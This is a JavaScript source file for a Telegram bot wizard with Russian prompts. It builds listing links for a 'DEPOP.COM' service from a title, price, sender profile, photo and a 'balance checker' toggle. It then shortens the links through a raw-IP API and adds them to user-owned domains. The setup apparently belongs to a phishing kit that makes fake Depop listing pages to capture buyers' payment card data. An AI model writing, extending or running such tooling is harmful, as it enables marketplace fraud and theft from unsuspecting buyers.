const WizardScene = require("telegraf/scenes/wizard");
const { Request, Ad, Service, Profiles,MyDomains } = require("../../database");
const locale = require("../../locale");
const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const log = require("../../helpers/log");

const { default: axios } = require("axios");
const rand = require("../../helpers/rand");
const myAd = require("../../commands/myAd");
const downloadImage = require("../../helpers/downloadImage");

const scene = new WizardScene(
  "create_link_depop_com",
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "depop_com",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      ctx.scene.state.data = {};
      log(ctx, "перешёл к созданию ссылки DEPOP.COM (Всемир)");
      return ctx.wizard.nextStep();
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      ctx.scene.state.data.code = "depop_com";
      await ctx.scene
        .reply("Введите название объявления", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message?.text) return ctx.wizard.prevStep();

      ctx.scene.state.data.title = ctx.message.text;
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },


  async (ctx) => {
    try {
      const currencies = [
        { code: 'USD', flag: '🇺🇸' },
        { code: 'EUR', flag: '🇪🇺' },
        { code: 'GBP', flag: '🇬🇧' },
        { code: 'JPY', flag: '🇯🇵' },
        { code: 'CHF', flag: '🇨🇭' },
        { code: 'CAD', flag: '🇨🇦' },
        { code: 'AUD', flag: '🇦🇺' },
        { code: 'NZD', flag: '🇳🇿' },
        { code: 'CNY', flag: '🇨🇳' },
        { code: 'SGD', flag: '🇸🇬' },
        { code: 'HKD', flag: '🇭🇰' },
        { code: 'NOK', flag: '🇳🇴' },
        { code: 'SEK', flag: '🇸🇪' },
        { code: 'DKK', flag: '🇩🇰' },
        { code: 'KRW', flag: '🇰🇷' },
        { code: 'MXN', flag: '🇲🇽' },
        { code: 'BRL', flag: '🇧🇷' },
        { code: 'ZAR', flag: '🇿🇦' }
      ];
  
      // Разбиваем кнопки на строки по 3 в каждой
      const currencyButtons = currencies.reduce((rows, currency, index) => {
        const button = Markup.callbackButton(`${currency.flag} ${currency.code}`, currency.code);
        if (index % 3 === 0) rows.push([button]);
        else rows[rows.length - 1].push(button);
        return rows;
      }, []);
  
      // Добавляем кнопку "Отменить" в конец
      currencyButtons.push([Markup.callbackButton('Отменить', 'cancel')]);
  
      await ctx.scene.reply('Выберите валюту для указания цены объявления:', {
        reply_markup: Markup.inlineKeyboard(currencyButtons)
      });
  
      return ctx.wizard.next();
    } catch (err) {
      await ctx.reply('❌ Ошибка');
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      const selectedCurrency = ctx.callbackQuery?.data;
      if (!selectedCurrency) return ctx.wizard.back();
  
      ctx.scene.state.data.currency = selectedCurrency;
  
      await ctx.scene.reply(`Введите цену объявления (только число, в ${selectedCurrency})`, {
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton('Отменить', 'cancel')]
        ])
      });
  
      return ctx.wizard.next();
    } catch (err) {
      await ctx.reply('❌ Ошибка');
      return ctx.scene.leave();
    }
  },
  
 
  
  async (ctx) => {
    try {
      const currencySymbols = {
        USD: '$',
        EUR: '€',
        GBP: '£',
        JPY: '¥',
        CHF: '₣',
        CAD: '$',
        AUD: '$',
        NZD: '$',
        CNY: '¥',
        SGD: '$',
        HKD: '$',
        NOK: 'kr',
        SEK: 'kr',
        DKK: 'kr',
        KRW: '₩',
        MXN: '$',
        BRL: 'R$',
        ZAR: 'R'
      };
      const amount = parseFloat(ctx.message?.text);
      if (isNaN(amount)) {
        await ctx.scene.reply('Пожалуйста, введите корректное число.');
        return ctx.wizard.back();
      }
  
      const currencyCode = ctx.scene.state.data.currency;
      const currencySymbol = currencySymbols[currencyCode] || currencyCode;
      const formattedAmount = amount % 1 === 0 ? amount.toFixed(0) : amount.toFixed(2);
  
      ctx.scene.state.data.price = `${formattedAmount} ${currencySymbol}`;
  
      // Продолжение логики обработки данных
  
      return ctx.wizard.nextStep();
    } catch (err) {
      await ctx.reply('❌ Ошибка');
      return ctx.scene.leave();
    }
  },
  

  async (ctx) => {
    try {
      const profiles = await Profiles.findAll({
        where: { userId: ctx.from.id },
      });

      var buttons = profiles.map((v) => [Markup.callbackButton(v.title, v.id)]);

      await ctx.scene.reply(`Выберите профиль`, {
        reply_markup: Markup.inlineKeyboard([
          ...buttons,
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },

  async (ctx) => {
    try {
      const profiles = await Profiles.findOne({
        where: { id: ctx.callbackQuery.data },
      });

      ctx.scene.state.data.address = profiles.address;
      ctx.scene.state.data.name = profiles.name;
      ctx.scene.state.data.phone = profiles.phone;

      await ctx.scene
        .reply("Отправьте изображение в сжатом формате", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Пропустить", "skip")],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.message?.photo?.length < 1 && ctx.callbackQuery?.data !== "skip")
        return ctx.wizard.prevStep();
      if (ctx.callbackQuery?.data == "skip") return ctx.wizard.nextStep();
      const photo_link = await ctx.telegram.getFileLink(
        ctx.message.photo[1].file_id
      );
      ctx.wizard.state.data.photo = await downloadImage(photo_link);
      return ctx.wizard.nextStep();
    } catch (err) {
      if (ctx.message.text) return ctx.wizard.prevStep();

      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene
        .reply("Чекер баланса", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("Включить", "true"),
              Markup.callbackButton("Выключить", "false"),
            ],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!["true", "false"].includes(ctx.callbackQuery?.data))
        return ctx.wizard.prevStep();
      ctx.scene.state.data.balanceChecker = ctx.callbackQuery.data == "true";
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: ctx.scene.state.data.code,
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      const ad = await Ad.create({
        id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
        userId: ctx.from.id,
        balanceChecker: true,
        photo: ctx.wizard.state.data.photo,
        name: ctx.scene.state.data.name,
        address: ctx.scene.state.data.address,
        price: ctx.scene.state.data.price,
        title: ctx.scene.state.data.title,
        serviceCode: ctx.scene.state.data.code,
      });

      const domains = await MyDomains.findOne({ 
        where: { userId: ctx.from.id }, 
      }); 
       
      let reductionUrl; 
       
      try { 
        const reduction = await axios.post( 
          "http://185.208.158.144/api/create", 
          { 
            target: `https://${service.domain}/${ad.id}`, 
            domain: service.shortlink || ctx.state.bot.shortlink, 
          }, 
          { timeout: 2000 } 
        ); 
       
        reductionUrl = reduction.data.url; 
      } catch (error) { 
        console.error("Ошибка при создании сокращенной ссылки:", error.message); 
       
        if (error.code === 'ECONNABORTED') { 
          console.warn("Запрос превысил допустимый тайм-аут."); 
        } else if (error.code === 'ECONNREFUSED' || error.code === 'ENOTFOUND') { 
          console.warn("Сервер сокращений недоступен."); 
        } else { 
          console.warn("Произошла непредвиденная ошибка:", error.message); 
        } 
       
        reductionUrl = null; // корректный fallback 
      } 
       
      const personalDomainLink = domains ? `https://${domains.domain}/${ad.id}` : null; 
       
      await ad.update({ 
        myDomainLink: personalDomainLink, 
        shortLink: reductionUrl, // используем переменную 
      }); 
       
log(ctx, `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`); 

// Собираем сообщение 
try {
  await myAd(ctx, ad.id);
} catch (err) {
  await ctx.replyOrEdit("❌ Ошибка при отображении объявления.").catch(() => {});
}
      ctx.updateType = "message";
      return ctx.scene.leave();
    } catch (err) {
      console.log(err);
    }
  }
);

module.exports = scene;
